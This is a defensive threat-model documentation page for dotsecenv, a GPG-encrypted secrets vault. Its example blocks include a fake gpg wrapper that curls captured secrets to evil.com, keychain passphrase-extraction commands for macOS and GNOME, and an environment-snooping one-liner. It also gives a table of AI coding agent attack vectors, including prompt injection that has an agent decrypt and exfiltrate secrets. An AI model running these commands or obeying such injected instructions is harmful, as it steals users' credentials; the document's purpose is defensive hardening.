@@ -1,0 +1,422 @@
+---
+title: Threat Model
+description: What dotsecenv protects against and its security boundaries
+---
+
+import { Aside, Tabs, TabItem } from "@astrojs/starlight/components";
+
+This document describes what threats dotsecenv protects against and its security boundaries. For details on the cryptographic mechanisms, see the [Security Model](/concepts/security-model).
+
+## What dotsecenv Protects Against
+
+### Accidental Git Commits
+
+The primary threat model. Secrets are encrypted in the vault file, so committing it doesn't expose plaintext.
+
+```bash
+git add vault   # Safe: secrets are encrypted
+git push        # Only encrypted blobs pushed
+```
+
+An attacker who obtains the vault file cannot read secrets without the private keys.
+
+### Unauthorized File Access
+
+If someone accesses your filesystem (backup, shared drive, stolen laptop), they see only:
+
+- Encrypted vault entries
+- Public key metadata (fingerprints, UIDs)
+- Timestamps
+
+**No plaintext secrets.**
+
+### Tampering
+
+Every vault entry includes a cryptographic signature. If someone modifies an entry:
+
+```bash
+dotsecenv validate
+# Error: signature verification failed for entry 42
+```
+
+The signature is created with the originator's private key, so:
+
+- You know who created each entry
+- You can detect modifications
+- There's non-repudiation for audits
+
+What this catches is **post-hoc tampering of an existing entry**: edits or deletions are detected because the recomputed hash and signature no longer match. What it does *not* catch is a holder of a signing key appending a freshly signed entry with any `added_at` they choose — `added_at` is self-reported. See [Audit Trail → What append-only can and cannot prove](/concepts/audit-trail/#what-append-only-can-and-cannot-prove) and use git history for the strongest "when did this land in the shared repo" signal.
+
+### Algorithm Downgrade
+
+The config file specifies minimum algorithm requirements:
+
+```yaml
+approved_algorithms:
+  - rsa:3072
+  - ecdsa:p384
+  - eddsa:ed25519
+```
+
+dotsecenv refuses to encrypt/decrypt with weaker algorithms.
+
+### Automated Secret Exfiltration
+
+AI coding assistants, build scripts, and other automated tools may attempt to read secrets programmatically. dotsecenv emits a **warning** when decrypting secrets in non-interactive terminals:
+
+```shell
+warning: decrypting in non-interactive terminal; for better security, configure GPG to require passphrase entry (https://dotsecenv.com/concepts/threat-model/#automated-secret-exfiltration)
+```
+
+<Aside type="caution" title="Not a Security Boundary">
+  This warning is for awareness only. dotsecenv does not block non-TTY access. TTY detection is trivially bypassed by attackers with code execution (e.g., using `script`, `unbuffer`, or allocating a PTY programmatically).
+
+An attacker can also bypass dotsecenv entirely by discovering your GPG key fingerprint from the vault and calling GPG directly.
+
+</Aside>
+
+**The only robust defense** against automated local secret exfiltration is **user presence verification** via GPG pinentry. Configure your GPG agent to never cache your passphrase:
+
+```ini
+# ~/.gnupg/gpg-agent.conf
+default-cache-ttl 0
+max-cache-ttl 0
+```
+
+This forces manual passphrase entry for every decryption operation, which automated tools cannot provide without higher privileges (e.g., root access or window server access to inject keystrokes).
+
+#### AI Coding Agents and GPG
+
+AI coding agents (Claude Code, GitHub Copilot CLI, Cursor, etc.) run shell commands as subprocesses of your terminal session. This creates a specific threat surface for GPG-encrypted secrets:
+
+**How agents interact with GPG pinentry:**
+
+AI agent Bash tools typically spawn subprocesses with `stdin` connected to `/dev/null` and no controlling terminal. This means:
+
+| Pinentry Program | Agent Can Trigger Decryption? | Why |
+|------------------|-------------------------------|-----|
+| `pinentry-mac` (macOS) | **Yes**, if passphrase is cached in Keychain or gpg-agent | GUI-based; checks Keychain silently before showing any dialog |
+| `pinentry-gnome3` (Linux) | **Yes**, if passphrase is cached in GNOME Keyring or gpg-agent | GUI-based; checks keyring before showing dialog |
+| `pinentry-qt` (Linux) | **Yes**, if cached | GUI-based |
+| `pinentry-tty` | **No** | Requires terminal input; fails with "Operation cancelled" when there is no controlling terminal |
+| `pinentry-curses` | **No** | Requires terminal input; fails with "Inappropriate ioctl for device" |
+
+Terminal-based pinentry programs (`pinentry-tty`, `pinentry-curses`) fail because the agent's subprocess has no controlling terminal. `/dev/tty` returns "Device not configured". Even when `GPG_TTY` is set to the parent terminal, the agent's terminal renderer is already reading from that device, creating input contention.
+
+GUI-based pinentry programs work because they open their own window, independent of terminal state. When the passphrase is already cached (in gpg-agent memory, the macOS Keychain, or GNOME Keyring), the GUI dialog never appears. The passphrase is returned silently.
+
+**The critical risk: once cached, any process can decrypt.** When a passphrase is cached in gpg-agent or an OS keychain, any process running as your user can invoke `gpg --decrypt` without interaction. This includes AI agents, build scripts, postinstall hooks, and malicious dependencies.
+
+#### OS Keychain Passphrase Extraction
+
+Beyond triggering GPG decryption indirectly, an attacker with code execution can extract the plaintext GPG passphrase directly from the OS keychain:
+
+**macOS (Login Keychain):**
+
+```bash
+# Extracts plaintext passphrase with zero user interaction
+security find-generic-password -s "GnuPG" -g
+```
+
+The macOS Login Keychain unlocks when the user logs in and remains accessible to all processes running as that user. While keychain ACLs can restrict which applications can use stored credentials for cryptographic operations, the `security` CLI (an Apple-signed system binary) can retrieve password values directly.
+
+**Linux (GNOME Keyring):**
+
+```bash
+# Extracts stored secrets via D-Bus
+secret-tool lookup xdg:schema org.gnupg.Passphrase
+```
+
+GNOME Keyring and KDE Wallet have similar session-scoped unlocking. Once unlocked at login, any user process can query stored items via D-Bus.
+
+<Aside type="danger" title="Blast Radius">
+  Once a key's passphrase is extracted or cached, **all** files encrypted to that key become decryptable. In dotsecenv terms, every secret in every vault encrypted to your key is exposed, not just individual secrets.
+</Aside>
+
+#### Preventing Keychain Passphrase Storage
+
+Add `no-allow-external-cache` to your GPG agent configuration to prevent pinentry from storing passphrases in the OS keychain:
+
+```ini
+# ~/.gnupg/gpg-agent.conf
+no-allow-external-cache
+```
+
+This ensures that passphrases are only held in gpg-agent's in-memory cache (governed by `default-cache-ttl` and `max-cache-ttl`) and are never written to persistent storage that other processes can query.
+
+After adding this option, delete any existing keychain entries:
+
+<Tabs>
+  <TabItem label="macOS">
+    ```bash
+    # Repeat until "could not be found"
+    security delete-generic-password -s "GnuPG"
+    ```
+  </TabItem>
+  <TabItem label="Linux (GNOME)">
+    ```bash
+    secret-tool clear xdg:schema org.gnupg.Passphrase
+    ```
+  </TabItem>
+</Tabs>
+
+Then reload gpg-agent:
+
+```bash
+gpgconf --reload gpg-agent
+```
+
+#### Recommended GPG Agent Configuration
+
+For a focused operational reference (health checks, pinentry compatibility, cache warming, troubleshooting), see [GPG Agent](/guides/gpg-agent/). The block below is the security-rationale view of the same configuration.
+
+For environments where AI agents or automated tools may run, balance security and usability:
+
+```ini
+# ~/.gnupg/gpg-agent.conf
+
+# Use a GUI pinentry appropriate for your platform:
+# macOS:  pinentry-program /opt/homebrew/opt/pinentry-mac/bin/pinentry-mac
+# Linux:  pinentry-program /usr/bin/pinentry-gnome3
+
+# Passphrase expires after 1 hour of inactivity
+default-cache-ttl 3600
+
+# Hard cap: passphrase must be re-entered after 4 hours regardless of activity
+max-cache-ttl 14400
+
+# Prevent pinentry from storing passphrases in OS keychain
+no-allow-external-cache
+```
+
+**For maximum security** (e.g., production secrets), set both TTLs to `0` to force passphrase entry on every operation.
+
+**For convenience** during development, the 1hr/4hr configuration above ensures that:
+
+- You enter your passphrase at most once per work session
+- The passphrase is never persisted to disk or OS keychain
+- An AI agent can only decrypt while the cache is warm (limited window)
+
+#### AI Agent Attack Vectors
+
+| Vector | Description | Mitigation |
+|--------|-------------|------------|
+| Direct decryption | Agent runs `dotsecenv secret get` or `gpg --decrypt` while passphrase is cached | Short cache TTLs; `no-allow-external-cache` |
+| Keychain extraction | Agent runs `security find-generic-password` (macOS) or `secret-tool lookup` (Linux) | `no-allow-external-cache`; delete existing keychain entries |
+| Prompt injection | Malicious content in repo files, issues, or fetched URLs instructs the agent to decrypt and exfiltrate | Agent-side guardrails; do not grant agents blanket tool permissions |
+| Supply chain | Malicious postinstall script in npm/pip/go dependency runs GPG commands | Short cache TTLs; audit dependencies; use hardware tokens |
+| Exfiltration | Agent pipes decrypted values to external URLs via curl/wget | Network monitoring; agent tool restrictions |
+
+#### Hardware Token Defense
+
+For keys protecting high-value secrets, use a hardware token (YubiKey, Nitrokey, etc.) configured to require **physical touch** for each cryptographic operation. This is the strongest defense against automated exfiltration:
+
+- No passphrase is stored in software. The private key never leaves the hardware.
+- Each operation requires physical presence (a touch on the device).
+- Software-only attacks cannot bypass the touch requirement.
+
+### Protecting .secenv Files
+
+To protect secrets stored in `.secenv` files from unauthorized decryption:
+
+1. Use the [shell plugin](/guides/shell-plugins) to decrypt secrets only when entering the directory.
+
+This ensures secrets are kept in **environment variables** (memory) rather than decrypted to disk. While effectively mitigating file theft, note that this is still vulnerable to **[Environment Snooping](#environment-snooping)** if an attacker has root/process access.
+
+### PATH Injection Attacks
+
+dotsecenv supports configuring an **absolute path** to the GPG executable via `gpg.program`. This provides several security benefits:
+
+#### Why Absolute Paths Matter
+
+When GPG is resolved via PATH, an attacker who can influence the PATH environment variable can redirect all cryptographic operations to a malicious binary:
+
+```bash
+# Attacker prepends malicious directory to PATH
+export PATH=/tmp/evil:$PATH
+
+# Creates fake gpg that steals secrets
+cat > /tmp/evil/gpg << 'EOF'
+#!/bin/bash
+# Log all arguments and stdin to attacker
+curl -X POST https://evil.com/steal -d "$(cat)"
+# Then call real gpg to avoid detection
+/usr/bin/gpg "$@"
+EOF
+chmod +x /tmp/evil/gpg
+
+# Now dotsecenv unknowingly uses the malicious gpg
+dotsecenv secret get DATABASE_PASSWORD  # Secrets exfiltrated!
+```
+
+**With an absolute path configured**, this attack fails:
+
+```yaml
+gpg:
+  program: /usr/bin/gpg # Always uses this exact binary
+```
+
+#### Security Benefits
+
+| Benefit                       | Description                                                                                                                         |
+| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
+| **PATH injection prevention** | Attackers cannot redirect GPG operations by modifying PATH, shell configs, or placing malicious binaries earlier in the search path |
+| **Deterministic execution**   | The same binary executes regardless of shell configuration, environment state, or current working directory                         |
+| **Multi-version isolation**   | Systems with multiple GPG installations (Homebrew, system, MacPorts) always use the explicitly configured version                   |
+| **Audit compliance**          | Security teams can verify exactly which binary handles cryptographic operations                                                     |
+| **Container safety**          | Works reliably in containers where PATH may be minimal or misconfigured                                                             |
+| **CI/CD reproducibility**     | Different runners with different PATH configurations still use the same GPG binary                                                  |
+
+#### Wrapper Script Support
+
+An absolute path can point to a wrapper script for additional security controls:
+
+```bash
+#!/bin/bash
+# /usr/local/bin/gpg-audited
+# Wrapper that logs all GPG operations
+
+LOG_FILE="/var/log/gpg-audit.log"
+echo "$(date -Iseconds) USER=$USER CMD=gpg ARGS=$*" >> "$LOG_FILE"
+
+# Optional: Block dangerous operations
+if [[ "$*" == *"--delete-key"* ]]; then
+    echo "Error: Key deletion blocked by policy" >&2
+    exit 1
+fi
+
+exec /usr/bin/gpg "$@"
+```
+
+```yaml
+gpg:
+  program: /usr/local/bin/gpg-audited
+```
+
+This enables:
+
+- Audit logging of all cryptographic operations
+- Policy enforcement (block certain operations)
+- Integration with hardware security modules (HSMs)
+- Rate limiting to prevent abuse
+
+#### Explicit GPG Path Configuration
+
+For security-sensitive environments, configure an explicit `gpg.program` path:
+
+```yaml
+gpg:
+  program: /usr/bin/gpg # Explicit path recommended
+```
+
+This prevents accidental reliance on PATH resolution.
+
+<Aside type="tip">
+  For maximum security, always configure `gpg.program` with an absolute path,
+  especially in production, CI/CD, and multi-user environments.
+</Aside>
+
+---
+
+## What dotsecenv Does NOT Protect Against
+
+<Aside type="caution" title="Security boundaries">
+  No tool provides absolute security. Understanding these limits is essential.
+</Aside>
+
+### Root/Admin Access
+
+An attacker with root access to your system can:
+
+- Read process memory
+- Intercept GPG passphrase entry
+- Access decrypted secrets in environment variables
+- Attach debuggers to running processes
+
+**Mitigation:** Full-disk encryption, secure boot, hardware security modules (HSMs).
+
+### Compromised Private Key
+
+If your GPG private key is stolen, the attacker can:
+
+- Decrypt any secret encrypted to your key
+- Impersonate you (create signatures)
+- Access historical vault entries
+
+**Mitigation:** Strong passphrase, hardware tokens (YubiKey), key rotation.
+
+### Environment Snooping
+
+Once a secret is decrypted and set as an environment variable, any process can read it:
+
+```bash
+# Other processes can see this
+cat /proc/$$/environ | tr '\0' '\n' | grep SECRET
+```
+
+**Mitigation:** Minimal scope, process isolation, containers.
+
+### Side-Channel Attacks
+
+Timing attacks, cache attacks, and other side-channel techniques are out of scope:
+
+- Requires specialized hardware/software
+- Mitigated at the GPG/OpenSSL layer
+- Defense in depth with secure infrastructure
+
+### Quantum Attacks
+
+Current public-key cryptography (RSA, ECC) is vulnerable to quantum computers:
+
+- Shor's algorithm breaks RSA/ECC
+- AES-256 remains strong (Grover's algorithm halves effective key size)
+
+**Mitigation:** GPG is working on post-quantum algorithms. When available, dotsecenv will support them.
+
+### Time-Tampering
+
+dotsecenv trusts the signer's asserted `added_at`. The signature commits the signer to that timestamp (non-repudiation of the assertion), but does not prove the entry was actually appended at that time. A legitimate key holder can backdate a fresh entry by signing it now with any `added_at`. The "Tampering" guarantee above protects existing entries from later modification; it does not protect the apparent chronology from a key holder forging plausible-looking history. For verifiable "when did this land in the shared vault," rely on the git commit timestamp — see [Audit Trail](/concepts/audit-trail/).
+
+---
+
+## Vault Safety in Public Repositories
+
+The vault is designed to be safe in public repositories:
+
+- All secrets encrypted with AES-256-GCM
+- Session keys protected by GPG public-key encryption
+- No plaintext secrets in any entry
+- Public keys and fingerprints are not sensitive
+
+**However**, defense in depth recommends:
+
+- Private repositories when possible
+- Access control at repository level
+- Regular key rotation
+
+<Aside type="caution">
+  The security of your vault depends on: 1. Strength of GPG keys (use 4096-bit
+  RSA or ECC) 2. Security of private key storage (passphrase, hardware token) 3.
+  Not sharing private keys
+</Aside>
+
+---
+
+## Summary
+
+| Threat                 | Protected? | Notes                                 |
+| ---------------------- | ---------- | ------------------------------------- |
+| Git exposure           | Yes        | Encrypted at rest                     |
+| File theft             | Yes        | Requires private key                  |
+| Tampering with existing entries | Yes | Hash + signature verification         |
+| Backdated insertion by key holder | No | `added_at` is self-reported; use `git log` |
+| Weak algorithms        | Yes        | Config-enforced minimums              |
+| PATH injection         | Yes        | Configure absolute `gpg.program` path |
+| Stealth network egress | Yes        | Hermetic e2e with dual verification   |
+| Automated exfiltration | Partial    | `pinentry` + `no-allow-external-cache` + short cache TTLs |
+| AI agent decryption    | Partial    | GUI pinentry bypasses when cached; use hardware tokens    |
+| Keychain extraction    | Partial    | `no-allow-external-cache`; delete existing entries        |
+| Root access            | No         | OS-level compromise                   |
+| Key theft              | No         | Guard your private key                |
+| Env snooping           | No         | Post-decryption risk                  |
+| Quantum                | No         | Future GPG update                     |
